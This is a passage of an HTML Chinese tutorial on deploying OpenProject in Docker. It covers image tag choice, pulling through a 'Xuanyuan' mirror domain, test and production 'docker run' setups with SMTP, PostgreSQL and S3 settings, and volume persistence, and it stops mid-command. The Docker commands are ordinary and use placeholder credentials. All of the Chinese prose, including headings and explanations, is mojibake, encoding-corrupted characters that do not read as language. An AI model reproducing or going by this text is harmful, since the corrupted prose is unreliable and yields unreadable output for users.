<p>è‹¥éœ€å¼€æœºè‡ªå¯DockeræœåŠ¡ï¼Œå¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">systemctl <span class="hljs-built_in">enable</span> docker --now
</code></pre>
<h3 data-id="heading-4">è½©è¾•é•œåƒè®¿é—®æ”¯æŒè¯´æ˜</h3>
<p>è½©è¾•é•œåƒè®¿é—®æ”¯æŒæ˜¯é¢å‘å¼€å‘è€…ä¸ç§‘ç ”ç”¨æˆ·çš„Dockeré•œåƒè®¿é—®ä¼˜åŒ–å¹³å°ï¼Œé•œåƒå†…å®¹æ¥æºäºå®˜æ–¹å…¬å…±ä»“åº“ï¼Œå¹³å°ä¸å­˜å‚¨ã€ä¸ä¿®æ”¹ã€ä¸ç”Ÿäº§ã€ä¸åˆ†å‘é•œåƒå†…å®¹ï¼Œä»…æä¾›è®¿é—®è·¯å¾„ä¼˜åŒ–ä¸æŠ€æœ¯æ”¯æŒèƒ½åŠ›ï¼Œå¯æœ‰æ•ˆæå‡<code>openproject/openproject</code>é•œåƒçš„æ‹‰å–é€Ÿåº¦ï¼Œè§£å†³æµ·å¤–é•œåƒæ‹‰å–è¶…æ—¶é—®é¢˜ã€‚</p>
<h2 data-id="heading-5">é•œåƒå‡†å¤‡</h2>
<h3 data-id="heading-6">é•œåƒæ ‡ç­¾é€‰æ‹©</h3>
<p>OpenProjecté•œåƒéµå¾ªè¯­ä¹‰åŒ–ç‰ˆæœ¬è§„èŒƒï¼Œæ ‡ç­¾åˆ†ä¸º<strong>éæµ®åŠ¨æ ‡ç­¾</strong>å’Œ<strong>æµ®åŠ¨æ ‡ç­¾</strong>ï¼Œæ¨èç”Ÿäº§ç¯å¢ƒä½¿ç”¨<strong>ç¨³å®šç‰ˆéæµ®åŠ¨æ ‡ç­¾</strong>ä»¥ä¿è¯ç‰ˆæœ¬ç¨³å®šæ€§å’Œæ•°æ®å…¼å®¹æ€§ï¼š</p>
<ol>
<li>éæµ®åŠ¨æ ‡ç­¾ï¼ˆç”Ÿäº§ç¯å¢ƒæ¨èï¼‰ï¼š<code>X.Y.Z</code>ã€<code>X.Y.Z-slim</code>ã€<code>X.Y.Z-slim-bim</code>ï¼ˆå¦‚<code>17.0.0-slim-bim</code>ï¼‰ï¼Œå¯¹åº”å”¯ä¸€ç¨³å®šç‰ˆæœ¬ï¼Œéœ€æ‰‹åŠ¨æ›´æ–°æ ‡ç­¾ä»¥å‡çº§ç‰ˆæœ¬ï¼Œå‡çº§å‰éœ€å¤‡ä»½æ•°æ®ã€‚</li>
<li>æµ®åŠ¨æ ‡ç­¾ï¼ˆæµ‹è¯•ç¯å¢ƒä¸“ç”¨ï¼‰ï¼š<code>X.Y</code>ã€<code>X.Y-slim</code>ï¼ˆå°ç‰ˆæœ¬è‡ªåŠ¨æ›´æ–°ï¼‰ã€<code>X</code>ã€<code>X-slim</code>ï¼ˆå¤§/å°ç‰ˆæœ¬è‡ªåŠ¨æ›´æ–°ï¼‰ã€<code>dev</code>ã€<code>dev-slim</code>ï¼ˆå¤œé—´å¼€å‘ç‰ˆï¼‰ã€<code>X-rc</code>ï¼ˆå€™é€‰å‘å¸ƒç‰ˆï¼‰ï¼Œä¸ä¿è¯æ•°æ®å…¼å®¹æ€§ï¼Œå‡çº§å¯èƒ½å¯¼è‡´æœåŠ¡å¼‚å¸¸ï¼Œ<strong>ä¸¥ç¦ç”¨äºç”Ÿäº§ç¯å¢ƒ</strong>ã€‚</li>
</ol>
<h3 data-id="heading-7">æ‹‰å–OpenProjecté•œåƒ</h3>
<p>ä½¿ç”¨è½©è¾•é•œåƒè®¿é—®æ”¯æŒåŸŸåæ‹‰å–<strong>ç¨³å®šç‰ˆ</strong>OpenProjecté•œåƒï¼ˆä»¥<code>17.0.0-slim-bim</code>ä¸ºä¾‹ï¼Œæµ‹è¯•ç¯å¢ƒå¦‚éœ€<code>all-in-one</code>ç‰ˆæœ¬ï¼Œå¯ç§»é™¤<code>-slim</code>åç¼€ï¼Œå¦‚éœ€RC/devç‰ˆæœ¬ï¼Œå¯æ›¿æ¢ä¸º<code>17-rc-slim-bim</code>/<code>dev-slim-bim</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‹‰å–slimç‰ˆï¼ˆç”Ÿäº§ç¯å¢ƒå”¯ä¸€æ¨èï¼‰</span>
docker pull vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim

<span class="hljs-comment"># æ‹‰å–all-in-oneç‰ˆï¼ˆä»…æµ‹è¯•/PoC/æ¼”ç¤ºä½¿ç”¨ï¼‰</span>
docker pull vipxxx.xuanyuan.run/openproject/openproject:17.0.0-bim
</code></pre>
<p>è‹¥éœ€ç›´æ¥æ‹‰å–å®˜æ–¹é•œåƒï¼Œå¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker pull openproject/openproject:17.0.0-slim
</code></pre>
<p>æ‹‰å–å®Œæˆåï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤éªŒè¯é•œåƒæ˜¯å¦æˆåŠŸä¸‹è½½ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker images | grep openproject
</code></pre>
<p>è‹¥è¾“å‡ºç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼Œè¯´æ˜é•œåƒæ‹‰å–æˆåŠŸï¼š</p>
<pre><code class="hljs language-xml" lang="xml">vipxxx.xuanyuan.run/openproject/openproject   17.0.0-slim-bim   <span class="hljs-tag">&lt;<span class="hljs-name">é•œåƒID</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">åˆ›å»ºæ—¶é—´</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">å¤§å°</span>&gt;</span>
</code></pre>
<h2 data-id="heading-8">å®¹å™¨éƒ¨ç½²</h2>
<h3 data-id="heading-9">å¿«é€Ÿå¯åŠ¨ï¼ˆAll-in-Oneå®¹å™¨ï¼Œä»…æµ‹è¯•/PoC/æ¼”ç¤ºï¼‰</h3>
<p>å¯¹äºæµ‹è¯•ã€PoCã€æ¼”ç¤ºæˆ–éå…³é”®å°å‹ä¸šåŠ¡å¿«é€Ÿä¸Šæ‰‹åœºæ™¯ï¼Œå¯ä½¿ç”¨<code>all-in-one</code>é•œåƒä¸€é”®å¯åŠ¨OpenProjectï¼Œæ— éœ€é¢å¤–é…ç½®å¤–éƒ¨ä¾èµ–ï¼Œ<strong>è¯¥æ–¹æ¡ˆä¸¥ç¦ç”¨äºæ ¸å¿ƒç”Ÿäº§ç¯å¢ƒ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker run -td \
  --name openproject-test \
  --restart=unless-stopped \  <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒå¯é€‰ï¼Œå®¹å™¨å¼‚å¸¸è‡ªåŠ¨é‡å¯</span>
  -p 8080:80 \
  -e SECRET_KEY_BASE=$(openssl rand -hex 32) \  <span class="hljs-comment"># ä»…æµ‹è¯•ç¯å¢ƒä¸´æ—¶ç”Ÿæˆï¼Œç”Ÿäº§ç¯å¢ƒç¦æ­¢åŠ¨æ€ç”Ÿæˆ</span>
  -e OPENPROJECT_HOST__NAME=localhost:8080 \    <span class="hljs-comment"># åº”ç”¨è®¿é—®åŸŸå/ç«¯å£ï¼Œéœ€ä¸å¤–éƒ¨è®¿é—®åœ°å€ä¸€è‡´</span>
  -e OPENPROJECT_HTTPS=<span class="hljs-literal">false</span> \                  <span class="hljs-comment"># ç¦ç”¨HTTPSï¼ˆä»…æµ‹è¯•ç¯å¢ƒï¼‰</span>
  -e OPENPROJECT_DEFAULT__LANGUAGE=zh-CN \      <span class="hljs-comment"># é»˜è®¤è¯­è¨€ï¼ˆä¸­æ–‡/è‹±æ–‡ï¼šzh-CN/enï¼‰</span>
  -v openproject_test_data:/var/openproject \   <span class="hljs-comment"># å‘½åæ•°æ®å·æŒä¹…åŒ–æµ‹è¯•æ•°æ®</span>
  vipxxx.xuanyuan.run/openproject/openproject:17.0.0-bim
</code></pre>
<h4 data-id="heading-10">å‚æ•°è¯´æ˜</h4>
<ul>
<li><code>-td</code>ï¼š<code>-t</code>åˆ†é…ä¼ªç»ˆç«¯ï¼Œè§£å†³æŸäº›Ruby loggeråœ¨æ— TTYç¯å¢ƒä¸‹å†™å…¥<code>/dev/stdout</code>çš„æƒé™å¼‚å¸¸é—®é¢˜ï¼›<code>-d</code>åå°è¿è¡Œå®¹å™¨ï¼ˆå¦‚éœ€æŸ¥çœ‹å®æ—¶æ—¥å¿—ï¼Œå¯ç§»é™¤<code>-d</code>ï¼Œåœæ­¢æ—¶æŒ‰<code>CTRL-C</code>å³å¯ï¼Œ<code>-i</code>æ— å®é™…æ„ä¹‰å·²ç§»é™¤ï¼‰ã€‚</li>
<li><code>--name openproject-test</code>ï¼šæŒ‡å®šå®¹å™¨åç§°ï¼Œä¾¿äºåç»­ç®¡ç†ã€‚</li>
<li><code>--restart=unless-stopped</code>ï¼šå®¹å™¨å¼‚å¸¸é€€å‡ºæˆ–æœåŠ¡å™¨é‡å¯åè‡ªåŠ¨é‡å¯ï¼Œæµ‹è¯•ç¯å¢ƒå¯é€‰ï¼Œç”Ÿäº§ç¯å¢ƒéœ€é…ç½®ä¸º<code>always</code>ã€‚</li>
<li><code>-p 8080:80</code>ï¼šå°†å®¹å™¨å†…80ç«¯å£æ˜ å°„åˆ°ä¸»æœº8080ç«¯å£ã€‚</li>
<li><code>SECRET_KEY_BASE</code>ï¼šRailsåº”ç”¨æ ¸å¿ƒåŠ å¯†å¯†é’¥ï¼Œ<strong>æ‰€æœ‰å®ä¾‹å¿…é¡»ä¿æŒä¸€è‡´</strong>ï¼Œæµ‹è¯•ç¯å¢ƒå¯ä¸´æ—¶ç”Ÿæˆï¼Œ<strong>ä»»ä½•ç”Ÿäº§ç¯å¢ƒç¦æ­¢åœ¨<code>docker run</code>ä¸­åŠ¨æ€ç”Ÿæˆè¯¥å¯†é’¥</strong>ï¼Œå¦åˆ™å®¹å™¨é‡å»º/æ‰©å®¹åä¼šå¯¼è‡´ç”¨æˆ·Sessionå…¨éƒ¨å¤±æ•ˆã€Cookieè§£å¯†å¤±è´¥ï¼Œç”Ÿäº§ç¯å¢ƒéœ€é€šè¿‡Docker Secret/.envæ–‡ä»¶é›†ä¸­ç®¡ç†å¹¶å›ºå®šå€¼ã€‚</li>
<li><code>OPENPROJECT_HOST__NAME</code>ï¼šåº”ç”¨å¯¹å¤–è®¿é—®çš„ä¸»æœºåä¸ç«¯å£ï¼Œç”¨äºç”Ÿæˆé‚®ä»¶é“¾æ¥ã€è¡¨å•åœ°å€ï¼Œéœ€ä¸ç”¨æˆ·æµè§ˆå™¨è®¿é—®åœ°å€ä¸€è‡´ï¼Œé¿å…HOSTå¤´æ³¨å…¥æ¼æ´ï¼›*<em>ä¸è¦å¡«å†™0.0.0.0ã€<em>æˆ–çº¯å†…ç½‘IPï¼Œå¦åˆ™ä¼šå¯¼è‡´ç™»å½•è·³è½¬ã€é‚®ä»¶é“¾æ¥ã€CSRFæ ¡éªŒå¼‚å¸¸</em></em>ã€‚</li>
<li><code>OPENPROJECT_HTTPS</code>ï¼šæ˜¯å¦å¯ç”¨HTTPSæ¨¡å¼ï¼Œç”Ÿäº§ç¯å¢ƒéœ€è®¾ä¸º<code>true</code>ï¼Œå¹¶é…åˆSSLè¯ä¹¦é…ç½®ã€‚</li>
<li>OpenProjectå®˜æ–¹é•œåƒå·²å†…ç½®å¥åº·æ£€æŸ¥ï¼Œæ— éœ€åœ¨<code>docker run</code>å‘½ä»¤ä¸­é¢å¤–é…ç½®ï¼Œè‹¥éœ€è‡ªå®šä¹‰å¥åº·æ£€æŸ¥ï¼Œå¯ä½¿ç”¨<code>--health-cmd</code>ç­‰ç³»åˆ—å‚æ•°ï¼ˆç¤ºä¾‹è§æ–‡æœ«è¡¥å……ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-11">å¯åŠ¨éªŒè¯</h4>
<p>å®¹å™¨é¦–æ¬¡å¯åŠ¨éœ€åˆå§‹åŒ–æ•°æ®åº“ä¸é™æ€èµ„æºï¼Œè€—æ—¶çº¦3-5åˆ†é’Ÿï¼Œå¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å¯åŠ¨æ—¥å¿—ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker logs -f openproject-test
</code></pre>
<p>å½“æ—¥å¿—ä¸­å‡ºç°<code>Admin user created: login: admin, password: admin</code>ï¼ˆæˆ–éšæœºå¯†ç ï¼‰æ—¶ï¼Œè¯´æ˜å¯åŠ¨æˆåŠŸï¼Œå¯é€šè¿‡æµè§ˆå™¨è®¿é—®<code>http://&lt;æœåŠ¡å™¨IP&gt;:8080</code>è¿›å…¥OpenProjectç™»å½•é¡µé¢ã€‚</p>
<h3 data-id="heading-12">è¿›é˜¶éƒ¨ç½²ï¼ˆè‡ªå®šä¹‰é…ç½®ï¼Œç”Ÿäº§å‰æœŸå‡†å¤‡ï¼Œä»…ä½¿ç”¨slimç‰ˆï¼‰</h3>
<p>å¯¹äºéœ€è¦è‡ªå®šä¹‰æ•°æ®åº“ã€é‚®ä»¶æœåŠ¡ã€å­ç›®å½•éƒ¨ç½²çš„åœºæ™¯ï¼Œ<strong>ä»…ä½¿ç”¨slimç‰ˆé•œåƒ</strong>ï¼ˆç”Ÿäº§ç¯å¢ƒå”¯ä¸€æ¨èï¼‰ï¼Œéœ€é…åˆå¤–éƒ¨PostgreSQLæ•°æ®åº“ï¼Œå¹¶é…ç½®SMTPé‚®ä»¶æœåŠ¡ä¸å­ç›®å½•è®¿é—®ï¼ŒåŒæ—¶è¡¥å……ç”Ÿäº§å¿…å¤‡çš„é‡å¯ç­–ç•¥ä¸å¥åº·æ£€æŸ¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name openproject-advanced \
  --restart=always \  <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒå¿…å¤‡ï¼Œå®¹å™¨å¼‚å¸¸æˆ–æœåŠ¡å™¨é‡å¯åè‡ªåŠ¨é‡å¯</span>
  -p 8080:80 \
  --cpus=2 \  <span class="hljs-comment"># é™åˆ¶CPUæ ¸å¿ƒæ•°ï¼Œé¿å…èµ„æºæŠ¢å </span>
  --memory=4g \  <span class="hljs-comment"># é™åˆ¶å†…å­˜ä½¿ç”¨</span>
  --memory-swap=6g \  <span class="hljs-comment"># é™åˆ¶å†…å­˜+äº¤æ¢ç©ºé—´ï¼ˆcgroup v2ç¯å¢ƒä¸­å¯èƒ½æ— æ•ˆï¼Œä»…ä½œå‚è€ƒï¼‰</span>
  -e SECRET_KEY_BASE=your-fixed-secret-key-here \  <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒå›ºå®šå€¼ï¼Œç¦æ­¢åŠ¨æ€ç”Ÿæˆï¼Œåç»­æ›¿æ¢ä¸ºDocker Secret/.env</span>
  -e OPENPROJECT_HOST__NAME=openproject.example.com \
  -e OPENPROJECT_HTTPS=<span class="hljs-literal">true</span> \
  -e OPENPROJECT_RAILS__RELATIVE__URL__ROOT=/openproject \  <span class="hljs-comment"># å­ç›®å½•éƒ¨ç½²ï¼Œè®¿é—®è·¯å¾„ä¸º /openproject</span>
  <span class="hljs-comment"># å¤–éƒ¨PostgreSQLæ•°æ®åº“é…ç½®ï¼ˆç”Ÿäº§ç¯å¢ƒå»ºè®®ä½¿ç”¨Docker Secretå­˜å‚¨å‡­æ®ï¼Œé¿å…æ˜æ–‡ï¼‰</span>
  -e DATABASE_URL=postgresql://openproject_user:openproject_password@db-host:5432/openproject \
  <span class="hljs-comment"># SMTPé‚®ä»¶æœåŠ¡é…ç½®ï¼ˆç”Ÿäº§ç¯å¢ƒå»ºè®®ä½¿ç”¨Docker Secretå­˜å‚¨å‡­æ®ï¼Œé¿å…æ˜æ–‡ï¼‰</span>
  -e EMAIL_DELIVERY_METHOD=smtp \
  -e SMTP_ADDRESS=smtp.example.com \
  -e SMTP_PORT=587 \
  -e SMTP_USER_NAME=notify@example.com \
  -e SMTP_PASSWORD=your-smtp-password \
  -e SMTP_AUTHENTICATION=login \
  -e SMTP_ENABLE_STARTTLS_AUTO=<span class="hljs-literal">true</span> \
  <span class="hljs-comment"># æ•°æ®æŒä¹…åŒ–ï¼ˆç”Ÿäº§ç¯å¢ƒå¿…å¤‡ï¼‰</span>
  -v openproject_data:/var/lib/openproject \
  -v openproject_config:/etc/openproject \
  -v openproject_logs:/var/log/openproject \
  vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim
</code></pre>
<h4 data-id="heading-13">å…³é”®æ³¨æ„ç‚¹</h4>
<ol>
<li>å¤–éƒ¨æ•°æ®åº“éœ€æå‰åˆ›å»º<code>openproject</code>æ•°æ®åº“ä¸å¯¹åº”æƒé™ç”¨æˆ·ï¼ŒPostgreSQLç‰ˆæœ¬éœ€<strong>13â€“16ï¼ˆç”Ÿäº§æ¨è14/15ï¼‰</strong>ï¼Œç”Ÿäº§ç¯å¢ƒå»ºè®®å•ç‹¬éƒ¨ç½²æ•°æ®åº“é›†ç¾¤ï¼Œå®ç°é«˜å¯ç”¨ã€‚</li>
<li>OpenProjecté•œåƒé»˜è®¤ä»¥<strong>érootç”¨æˆ·</strong>è¿è¡Œï¼ˆç”¨æˆ·å<code>openproject</code>ï¼ŒUID/GIDå›ºå®šï¼‰ï¼Œæ— éœ€æ·»åŠ <code>--user root</code>å‚æ•°ï¼Œå¼ºè¡Œä½¿ç”¨rootç”¨æˆ·ä¼šå¸¦æ¥å®‰å…¨é£é™©ï¼Œä¸”å¯èƒ½å¯¼è‡´å®¹å™¨å†…æ–‡ä»¶æƒé™é”™ä¹±ã€‚</li>
<li>å­ç›®å½•éƒ¨ç½²æ—¶ï¼Œåç»­åå‘ä»£ç†é…ç½®éœ€ä¸<code>OPENPROJECT_RAILS__RELATIVE__URL__ROOT</code>ä¿æŒä¸€è‡´ã€‚</li>
<li>é‚®ä»¶æœåŠ¡é…ç½®å®Œæˆåï¼Œå¯åœ¨OpenProjectç³»ç»Ÿè®¾ç½®ä¸­æµ‹è¯•é‚®ä»¶å‘é€åŠŸèƒ½ï¼ŒéªŒè¯é…ç½®æœ‰æ•ˆæ€§ã€‚</li>
<li>ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒSMTP/æ•°æ®åº“å‡­æ®ä¸¥ç¦æ˜æ–‡å†™å…¥å‘½ä»¤è¡Œï¼Œéœ€é€šè¿‡<code>Docker Secret</code>æˆ–<code>.env</code>æ–‡ä»¶ç®¡ç†ï¼Œé¿å…æ³„éœ²ã€‚</li>
<li>åœ¨**cgroup v2ç¯å¢ƒï¼ˆUbuntu 22.04+/Debian 12+ï¼‰**ä¸­ï¼Œ<code>--memory-swap</code>å‚æ•°å¯èƒ½è¢«å¿½ç•¥ï¼Œç”Ÿäº§ç¯å¢ƒèµ„æºé™åˆ¶è¯·ä»¥<code>--memory</code>ä¸ºä¸»ï¼Œå¦‚éœ€ç²¾å‡†æ§åˆ¶äº¤æ¢ç©ºé—´ï¼Œéœ€é¢å¤–é…ç½®ç³»ç»Ÿcgroupå‚æ•°å¹¶å¯ç”¨<code>swapaccount=1</code>ã€‚</li>
<li>OpenProjecté•œåƒå†…ç½®å¥åº·æ£€æŸ¥ï¼Œæ— éœ€é¢å¤–é…ç½®ï¼Œè‹¥éœ€è‡ªå®šä¹‰å¥åº·æ£€æŸ¥ï¼Œå¯æ·»åŠ å¦‚ä¸‹å‚æ•°ï¼ˆç¤ºä¾‹ï¼Œå…¼å®¹æ›´å¤šç‰ˆæœ¬ï¼Œé¿å…<code>/health</code>è·¯å¾„404é—®é¢˜ï¼‰ï¼š
<pre><code class="hljs language-bash" lang="bash">--health-cmd=<span class="hljs-string">"curl -f http://localhost/ || exit 1"</span> \
--health-interval=30s \
--health-timeout=5s \
--health-retries=3 \
--health-start-period=300s
</code></pre>
</li>
</ol>
<hr/>
<h4 data-id="heading-14">é•œåƒæ•°æ®è·¯å¾„å¯¹ç…§è¡¨ï¼ˆé¿å…æŒ‚è½½é”™è¯¯ï¼‰</h4>























<table><thead><tr><th>é•œåƒç±»å‹</th><th>æ ¸å¿ƒæ•°æ®æŒä¹…åŒ–è·¯å¾„</th><th>é…ç½®æ–‡ä»¶è·¯å¾„</th><th>æ—¥å¿—æ–‡ä»¶è·¯å¾„</th></tr></thead><tbody><tr><td>all-in-one</td><td><code>/var/openproject</code>ï¼ˆåŒ…å«æ‰€æœ‰æ•°æ®ï¼‰</td><td>å†…ç½®åœ¨æ ¸å¿ƒè·¯å¾„ä¸­</td><td>å†…ç½®åœ¨æ ¸å¿ƒè·¯å¾„ä¸­</td></tr><tr><td>slimï¼ˆç”Ÿäº§æ¨èï¼‰</td><td><code>/var/lib/openproject</code>ï¼ˆåº”ç”¨æ•°æ®ï¼‰</td><td><code>/etc/openproject</code></td><td><code>/var/log/openproject</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-15">ç”Ÿäº§ç¯å¢ƒä¼˜åŒ–é…ç½®</h2>
<h3 data-id="heading-16">æ•°æ®æŒä¹…åŒ–ï¼ˆæ ¸å¿ƒä¿éšœï¼Œé¿å…æ•°æ®ä¸¢å¤±ï¼Œä»…ä½¿ç”¨slimç‰ˆï¼‰</h3>
<p>ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¿…é¡»ç¡®ä¿OpenProjectçš„æ•°æ®ï¼ˆé…ç½®ã€æ—¥å¿—ã€é™æ€èµ„æºï¼‰æŒä¹…åŒ–å­˜å‚¨ï¼Œé¿å…å®¹å™¨é‡å¯ã€åˆ é™¤å¯¼è‡´æ•°æ®ä¸¢å¤±ï¼Œ<strong>æ‰€æœ‰ç”Ÿäº§é…ç½®å‡åŸºäºslimç‰ˆé•œåƒï¼Œä¸æ”¯æŒall-in-oneç‰ˆ</strong>ã€‚æ¨èä¸‰ç§æŒä¹…åŒ–æ–¹æ¡ˆï¼Œä¼˜å…ˆçº§ä»é«˜åˆ°ä½ï¼š</p>
<h4 data-id="heading-17">æ–¹æ¡ˆ1ï¼šå¯¹è±¡å­˜å‚¨ï¼ˆS3/MinIOï¼Œé›†ç¾¤éƒ¨ç½²å¼ºçƒˆæ¨èï¼‰</h4>
<p>OpenProjectæ”¯æŒå°†é™„ä»¶ã€å¯¼å‡ºæ–‡ä»¶ç­‰å­˜å‚¨åˆ°S3å…¼å®¹å¯¹è±¡å­˜å‚¨ï¼Œé¿å…æœ¬åœ°æ–‡ä»¶å­˜å‚¨çš„å¤šå‰¯æœ¬æ•°æ®é”™ä¹±é—®é¢˜ï¼Œ<strong>æ˜¯é›†ç¾¤éƒ¨ç½²çš„å”¯ä¸€æ¨èæ–¹æ¡ˆ</strong>ï¼Œæ”¯æŒé«˜å¹¶å‘ã€é«˜å¯ç”¨ï¼Œæ— æ–‡ä»¶è¦†ç›–/ä¸¢å¤±é£é™©ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name openproject-prod \
  --restart=always \
  -p 8080:80 \
  --cpus=4 \
  --memory=8g \
  --memory-swap=12g \  <span class="hljs-comment"># cgroup v2ç¯å¢ƒä¸­å¯èƒ½æ— æ•ˆï¼Œä»…ä½œå‚è€ƒ</span>
  -e SECRET_KEY_BASE=your-fixed-secret-key-here \  <span class="hljs-comment"># é›†ç¾¤ç¯å¢ƒåç»­æ›¿æ¢ä¸ºDocker Secretï¼Œç¦æ­¢åŠ¨æ€ç”Ÿæˆ</span>
  -e OPENPROJECT_HOST__NAME=openproject.example.com \
  -e OPENPROJECT_HTTPS=<span class="hljs-literal">true</span> \
  <span class="hljs-comment"># å¯¹è±¡å­˜å‚¨é…ç½®ï¼ˆS3/MinIOï¼Œé›†ç¾¤éƒ¨ç½²å¿…å¤‡ï¼‰</span>
  -e OPENPROJECT_ATTACHMENTS__STORAGE=<span class="hljs-string">"fog"</span> \
  -e OPENPROJECT_FOG_DIRECTORY=<span class="hljs-string">"openproject-attachments"</span> \
  -e OPENPROJECT_FOG_CREDENTIALS_PROVIDER=<span class="hljs-string">"AWS"</span> \
  -e OPENPROJECT_FOG_CREDENTIALS_AWS__ACCESS__KEY__ID=<span class="hljs-string">"your-access-key"</span> \
  -e OPENPROJECT_FOG_CREDENTIALS_AWS__SECRET__ACCESS__KEY=<span class="hljs-string">"your-secret-key"</span> \
  -e OPENPROJECT_FOG_CREDENTIALS_REGION=<span class="hljs-string">"cn-north-1"</span> \
  -e OPENPROJECT_FOG_CREDENTIALS_ENDPOINT=<span class="hljs-string">"https://minio.example.com"</span> \  <span class="hljs-comment"># MinIOéœ€æ·»åŠ ç«¯ç‚¹é…ç½®</span>
  <span class="hljs-comment"># åŸºç¡€æ•°æ®æŒä¹…åŒ–ï¼ˆé…ç½®ã€æ—¥å¿—ï¼‰</span>
  -v openproject_prod_config:/etc/openproject \
  -v openproject_prod_logs:/var/log/openproject \
  vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim
</code></pre>
<h4 data-id="heading-18">æ–¹æ¡ˆ2ï¼šDockerå‘½åæ•°æ®å·ï¼ˆå•èŠ‚ç‚¹ç”Ÿäº§ç¯å¢ƒæ¨èï¼Œæ˜“äºç®¡ç†ï¼‰</h4>
<p>Dockeræ•°æ®å·ç”±Dockerç»Ÿä¸€ç®¡ç†ï¼Œæƒé™é…ç½®è‡ªåŠ¨ä¼˜åŒ–ï¼Œé€‚åˆ<strong>å•èŠ‚ç‚¹ç”Ÿäº§ç¯å¢ƒ</strong>ï¼Œä¸æ”¯æŒé›†ç¾¤å¤šå‰¯æœ¬ï¼ˆå¤šå‰¯æœ¬ä¼šå¯¼è‡´æ•°æ®é”™ä¹±ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æå‰åˆ›å»ºæ‰€éœ€æ•°æ®å·ï¼ˆå•èŠ‚ç‚¹ç”Ÿäº§ç¯å¢ƒï¼‰</span>
docker volume create openproject_prod_config
docker volume create openproject_prod_logs
docker volume create openproject_prod_assets  <span class="hljs-comment"># éå¿…éœ€ï¼Œä»…åœ¨æœªå¯ç”¨S3å¯¹è±¡å­˜å‚¨æ—¶æœ‰æ•ˆï¼Œæ–°ç‰ˆslimå¤šæ•°é™æ€èµ„æºèµ°ç¼–è¯‘+å¯¹è±¡å­˜å‚¨</span>

<span class="hljs-comment"># å¯åŠ¨ç”Ÿäº§ç¯å¢ƒå®¹å™¨ï¼ˆslimç‰ˆï¼Œå•èŠ‚ç‚¹å”¯ä¸€æ¨èï¼‰</span>
docker run -d \
  --name openproject-prod \
  --restart=always \
  -p 80:80 -p 443:443 \
  --cpus=4 \
  --memory=8g \
  --memory-swap=12g \  <span class="hljs-comment"># cgroup v2ç¯å¢ƒä¸­å¯èƒ½æ— æ•ˆï¼Œä»…ä½œå‚è€ƒ</span>
  -e SECRET_KEY_BASE=your-fixed-secret-key-here \  <span class="hljs-comment"># å›ºå®šå€¼ï¼Œç¦æ­¢åŠ¨æ€ç”Ÿæˆ</span>
  -e OPENPROJECT_HOST__NAME=openproject.example.com \
  -e OPENPROJECT_HTTPS=<span class="hljs-literal">true</span> \
  <span class="hljs-comment"># å•èŠ‚ç‚¹æœ¬åœ°é™æ€èµ„æºå­˜å‚¨ï¼ˆä»…å•å‰¯æœ¬æ”¯æŒï¼Œå¤šå‰¯æœ¬ç¦ç”¨ï¼Œè¯¥æŒ‚è½½éå¿…éœ€å¯çœç•¥ï¼‰</span>
  -v openproject_prod_assets:/var/openproject/assets \
  <span class="hljs-comment"># åŸºç¡€æ•°æ®æŒä¹…åŒ–</span>
  -v openproject_prod_config:/etc/openproject \
  -v openproject_prod_logs:/var/log/openproject \
  vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim
</code></pre>
<h4 data-id="heading-19">æ–¹æ¡ˆ3ï¼šæœ¬åœ°ç›®å½•ç»‘å®š/åˆ†å¸ƒå¼å­˜å‚¨ï¼ˆç‰¹æ®Šåœºæ™¯ï¼Œéœ€è°¨æ…ä½¿ç”¨ï¼‰</h4>
<ol>
<li>
<p>æœ¬åœ°ç›®å½•ç»‘å®šï¼šæ‰‹åŠ¨åˆ›å»ºä¸»æœºç›®å½•ï¼Œå°†å…¶æŒ‚è½½åˆ°å®¹å™¨å†…ï¼Œé€‚åˆéœ€è¦æ‰‹åŠ¨å¤‡ä»½ã€ä¿®æ”¹é…ç½®çš„<strong>å•èŠ‚ç‚¹ç‰¹æ®Šåœºæ™¯</strong>ï¼Œå¤šå‰¯æœ¬ç¦ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æå‰åˆ›å»ºä¸»æœºç›®å½•ï¼ˆå•èŠ‚ç‚¹ç”Ÿäº§ç¯å¢ƒï¼‰</span>
sudo <span class="hljs-built_in">mkdir</span> -p /var/openproject/prod/{config,logs,assets}
sudo <span class="hljs-built_in">chown</span> -R 1000:1000 /var/openproject/prod  <span class="hljs-comment"># é€‚é…å®¹å™¨érootç”¨æˆ·ï¼Œé¿å…å†™å…¥å¤±è´¥</span>
sudo <span class="hljs-built_in">chmod</span> -R 775 /var/openproject/prod

<span class="hljs-comment"># å¯åŠ¨ç”Ÿäº§ç¯å¢ƒå®¹å™¨ï¼ˆslimç‰ˆï¼Œå•èŠ‚ç‚¹ï¼‰</span>
docker run -d \
  --name openproject-prod \
  --restart=always \
  -p 80:80 -p 443:443 \
  --cpus=4 \
  --memory=8g \
